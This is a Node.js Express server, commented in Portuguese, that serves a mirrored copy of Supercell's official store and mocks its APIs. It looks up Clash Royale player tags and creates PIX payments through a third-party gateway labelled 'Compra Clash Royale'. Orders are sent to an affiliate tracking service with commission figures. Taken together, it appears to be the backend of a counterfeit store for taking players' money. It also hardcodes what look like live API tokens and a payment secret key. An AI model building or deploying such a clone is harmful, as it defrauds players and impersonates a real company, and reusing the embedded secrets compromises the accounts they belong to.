const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 3000;

// Serve arquivos estáticos com prioridade
// 1. Primeiro tenta na raiz
app.use(express.static(__dirname));

// 2. Depois tenta na pasta store.supercell.com
app.use(express.static(path.join(__dirname, 'store.supercell.com')));

// 3. Serve _next da pasta store.supercell.com
app.use('/_next', express.static(path.join(__dirname, 'store.supercell.com', '_next')));

// 4. Serve images da pasta store.supercell.com
app.use('/images', express.static(path.join(__dirname, 'store.supercell.com', 'images')));

// 5. Serve assets externos
app.use('/game-assets', express.static(path.join(__dirname, 'game-assets.store.supercell.com')));

// Mock das APIs
let apiManifest = [];
try {
  apiManifest = JSON.parse(fs.readFileSync('./api-data/manifest.json', 'utf8'));
} catch (e) {
  console.log('⚠️ Nenhum manifesto de API encontrado');
}

apiManifest.forEach(api => {
  try {
    const apiData = JSON.parse(fs.readFileSync(`./api-data/${api.file}`, 'utf8'));
    
    // Extrai path da URL
    const url = new URL(api.url);
    const apiPath = url.pathname + url.search;
    
    app.get(apiPath, (req, res) => {
      console.log(`📡 Mock API: ${apiPath}`);
      res.json(apiData.data);
    });
    
    app.post(apiPath, (req, res) => {
      console.log(`📡 Mock API (POST): ${apiPath}`);
      res.json(apiData.data);
    });
  } catch (e) {
    console.log(`⚠️ Erro ao carregar API: ${api.file}`);
  }
});

// Proxy para assets externos (imagens do jogo)
app.get('/external/*', (req, res, next) => {
  const filepath = path.join(__dirname, req.path);
  if (fs.existsSync(filepath)) {
    res.sendFile(filepath);
  } else {
    next();
  }
});

// ==========================================
// CLASH ROYALE API PROXY
// ==========================================
const https = require('https');
const API_TOKEN = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiIsImtpZCI6IjI4YTMxOGY3LTAwMDAtYTFlYi03ZmExLTJjNzQzM2M2Y2NhNSJ9.eyJpc3MiOiJzdXBlcmNlbGwiLCJhdWQiOiJzdXBlcmNlbGw6Z2FtZWFwaSIsImp0aSI6Ijc4MWZhNDVjLWMwZjctNDI2NC05Njc1LWRmZjg4NGEyOGExZCIsImlhdCI6MTc2ODI0MjA5Mywic3ViIjoiZGV2ZWxvcGVyLzY0NzlkNmNlLTRjZDEtN2U0Ni0wYjY4LTNkYjE2Mzg5MDY3ZCIsInNjb3BlcyI6WyJyb3lhbGUiXSwibGltaXRzIjpbeyJ0aWVyIjoiZGV2ZWxvcGVyL3NpbHZlciIsInR5cGUiOiJ0aHJvdHRsaW5nIn0seyJjaWRycyI6WyIyMDEuMTgyLjEyMy4xMzMiXSwidHlwZSI6ImNsaWVudCJ9XX0.vXpzQLqi8eo0seFPmuZddcC0F8TdVcIG7MXlL5KpxnOJas89vXxAtPX6j41CAoR5Y8YuOxCMWx9RWKOHPsGpYw';

app.get('/player', (req, res) => {
  let playerTag = req.query.tag;
  
  if (!playerTag) {
    return res.status(400).json({ error: 'Player tag is required' });
  }

  // Remove # se presente e codifica para URL
  playerTag = playerTag.replace('#', '');
  const encodedTag = encodeURIComponent('#' + playerTag);

  const options = {
    hostname: 'api.clashroyale.com',
    path: `/v1/players/${encodedTag}`,
    method: 'GET',
    headers: {
      'Authorization': `Bearer ${API_TOKEN}`,
      'Accept': 'application/json'
    }
  };

  console.log(`🏆 [CR API] Buscando jogador: #${playerTag}`);

  const apiReq = https.request(options, (apiRes) => {
    let data = '';
    
    apiRes.on('data', chunk => {
      data += chunk;
    });
    
    apiRes.on('end', () => {
      res.status(apiRes.statusCode).json(JSON.parse(data));
      
      if (apiRes.statusCode === 200) {
        const player = JSON.parse(data);
        console.log(`🏆 [CR API] Jogador encontrado: ${player.name} (${player.tag})`);
      } else {
        console.log(`🏆 [CR API] Erro: ${apiRes.statusCode}`);
      }
    });
  });

  apiReq.on('error', (error) => {
    console.error('🏆 [CR API] Erro na requisição:', error.message);
    res.status(500).json({ error: 'Failed to fetch player data', details: error.message });
  });

  apiReq.end();
});

// ==========================================
// MARCHA PAY - PIX PAYMENT API
// ==========================================
const MARCHA_PUBLIC_KEY = 'pk_YJl0fMP4j7PGAemvjkRFV_PcQBXotDd56PSNooXJf9thon91';
const MARCHA_SECRET_KEY = 'sk_EJXMXhMP7jBbriKR71iXozTLAUzUA3EgqF6XtWnWId8Wb9kI';

// Middleware para parsing JSON (necessário para POST requests)
app.use(express.json());

app.post('/api/create-pix', (req, res) => {
  const { amount, customer, items } = req.body;

  if (!amount || amount <= 0) {
    return res.status(400).json({ error: 'Amount is required and must be greater than 0' });
  }

  const auth = 'Basic ' + Buffer.from(MARCHA_PUBLIC_KEY + ':' + MARCHA_SECRET_KEY).toString('base64');

  const payload = {
    amount: Math.round(amount * 100), // Converte para centavos
    paymentMethod: 'pix',
    customer: customer || {
      name: 'Cliente',
      email: 'cliente@email.com',
      phone: '11999999999',
      document: {
        type: 'cpf',
        number: '00000000000'
      }
    },
    items: items || [
      {
        title: 'Compra Clash Royale',
        quantity: 1,
        tangible: true,
        unitPrice: Math.round(amount * 100)
      }
    ]
  };

  console.log('💳 [MARCHA PAY] Criando transação PIX...');
  console.log('💳 [MARCHA PAY] Valor:', amount, 'BRL (', payload.amount, 'centavos)');

  const postData = JSON.stringify(payload);

  const options = {
    hostname: 'api.marchabb.com',
    path: '/v1/transactions',
    method: 'POST',
    headers: {
      'Authorization': auth,
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const apiReq = https.request(options, (apiRes) => {
    let data = '';

    apiRes.on('data', chunk => {
      data += chunk;
    });

    apiRes.on('end', () => {
      try {
        const response = JSON.parse(data);
        
        if (apiRes.statusCode === 200 || apiRes.statusCode === 201) {
          console.log('💳 [MARCHA PAY] Transação criada com sucesso!');
          console.log('💳 [MARCHA PAY] ID:', response.id);
          console.log('💳 [MARCHA PAY] Status:', response.status);
          
          res.json({
            success: true,
            transactionId: response.id,
            status: response.status,
            amount: response.amount,
            pix: response.pix,
            secureUrl: response.secureUrl,
            expirationDate: response.pix?.expirationDate
          });
        } else {
          console.log('💳 [MARCHA PAY] Erro:', apiRes.statusCode);
          console.log('💳 [MARCHA PAY] Response:', data);
          res.status(apiRes.statusCode).json({
            success: false,
            error: 'Falha ao criar transação PIX',
            details: response
          });
        }
      } catch (parseError) {
        console.error('💳 [MARCHA PAY] Erro ao parsear resposta:', parseError.message);
        res.status(500).json({
          success: false,
          error: 'Erro ao processar resposta da API',
          details: parseError.message
        });
      }
    });
  });

  apiReq.on('error', (error) => {
    console.error('💳 [MARCHA PAY] Erro na requisição:', error.message);
    res.status(500).json({
      success: false,
      error: 'Falha na comunicação com a API de pagamento',
      details: error.message
    });
  });

  apiReq.write(postData);
  apiReq.end();
});

// ==========================================
// UTMIFY - TRACKING API
// ==========================================
const UTMIFY_API_TOKEN = 'YOUR_UTMIFY_API_TOKEN_HERE'; // Substitua pelo seu token

app.post('/api/utmify/order', (req, res) => {
  const { 
    orderId, 
    status, 
    paymentMethod,
    customer, 
    products, 
    trackingParameters, 
    totalPriceInCents,
    approvedDate,
    refundedAt
  } = req.body;

  if (!orderId || !customer || !products) {
    return res.status(400).json({ error: 'orderId, customer and products are required' });
  }

  // Calcula comissões (3% taxa do gateway)
  const gatewayFeePercent = 0.03;
  const gatewayFeeInCents = Math.round(totalPriceInCents * gatewayFeePercent);
  const userCommissionInCents = totalPriceInCents - gatewayFeeInCents;

  // Formata data atual em UTC
  const now = new Date();
  const createdAt = now.toISOString().replace('T', ' ').substring(0, 19);

  const payload = {
    orderId: orderId,
    platform: 'ClashRoyaleStore',
    paymentMethod: paymentMethod || 'pix',
    status: status || 'waiting_payment',
    createdAt: createdAt,
    approvedDate: approvedDate || null,
    refundedAt: refundedAt || null,
    customer: {
      name: customer.name || 'Cliente',
      email: customer.email || 'cliente@email.com',
      phone: customer.phone || null,
      document: customer.document || null,
      country: 'BR',
      ip: req.ip || req.connection.remoteAddress || null
    },
    products: products.map(p => ({
      id: p.id || `prod-${Date.now()}`,
      name: p.title || p.name,
      planId: null,
      planName: null,
      quantity: p.quantity || 1,
      priceInCents: p.unitPrice || p.priceInCents || 0
    })),
    trackingParameters: {
      src: trackingParameters?.src || null,
      sck: trackingParameters?.sck || null,
      utm_source: trackingParameters?.utm_source || null,
      utm_campaign: trackingParameters?.utm_campaign || null,
      utm_medium: trackingParameters?.utm_medium || null,
      utm_content: trackingParameters?.utm_content || null,
      utm_term: trackingParameters?.utm_term || null
    },
    commission: {
      totalPriceInCents: totalPriceInCents,
      gatewayFeeInCents: gatewayFeeInCents,
      userCommissionInCents: userCommissionInCents,
      currency: 'BRL'
    },
    isTest: false
  };

  console.log('📊 [UTMIFY] Enviando pedido:', orderId, '- Status:', status);

  const postData = JSON.stringify(payload);

  const options = {
    hostname: 'api.utmify.com.br',
    path: '/api-credentials/orders',
    method: 'POST',
    headers: {
      'x-api-token': UTMIFY_API_TOKEN,
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const apiReq = https.request(options, (apiRes) => {
    let data = '';

    apiRes.on('data', chunk => {
      data += chunk;
    });

    apiRes.on('end', () => {
      try {
        const response = JSON.parse(data);
        
        if (apiRes.statusCode === 200 || apiRes.statusCode === 201) {
          console.log('📊 [UTMIFY] Pedido enviado com sucesso!');
          res.json({ success: true, message: 'Order sent to UTMify', data: response });
        } else {
          console.log('📊 [UTMIFY] Erro:', apiRes.statusCode, data);
          res.status(apiRes.statusCode).json({ 
            success: false, 
            error: 'Failed to send order to UTMify',
            details: response 
          });
        }
      } catch (parseError) {
        console.error('📊 [UTMIFY] Erro ao parsear resposta:', parseError.message);
        res.status(500).json({ success: false, error: 'Error parsing UTMify response' });
      }
    });
  });

  apiReq.on('error', (error) => {
    console.error('📊 [UTMIFY] Erro na requisição:', error.message);
    res.status(500).json({ success: false, error: 'Failed to connect to UTMify API' });
  });

  apiReq.write(postData);
  apiReq.end();
});

// Fallback para SPA
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`\n🌐 Servidor rodando em http://localhost:${PORT}`);
  console.log(`🏆 Clash Royale API Proxy ativo em /player?tag=XXX`);
  console.log(`📡 ${apiManifest.length} APIs mockadas\n`);
});
